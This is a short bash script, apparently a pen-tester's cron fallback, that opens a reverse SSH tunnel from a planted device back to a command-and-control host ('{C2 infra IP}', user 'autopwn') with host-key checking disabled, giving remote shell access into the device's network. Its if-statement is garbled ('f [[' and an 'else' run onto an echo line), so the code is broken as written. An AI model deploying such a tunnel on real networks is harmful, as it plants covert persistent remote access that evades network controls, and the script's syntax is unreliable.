#!/bin/bash
#This is a last ditch effort to be tossed into cron in case the tunnel service AND VPN doesn't work!
#You might need to manually SSH in and "Accept" the key first
#I borrowed this from another GitHub like 3 years ago and honestly don't remember where - but I use it on my NUC for pen testing and like it. 

createTunnel() {
    /usr/bin/ssh -o StrictHostKeyChecking=no -i /home/pi/.ssh/{id_whatever} -N -R 2222:localhost:22 autopwn@{C2 infra IP}
    f [[ $? -eq 0 ]]; then
       echo Tunnel to jumpbox created successfully    else
        echo "[!] error occurred creating a tunnel to jumpbox"
    fi
}
/bin/pidof ssh
if [[ $? -ne 0 ]]; then
    echo "[+] creating new tunnel connection"
    createTunnel
fi
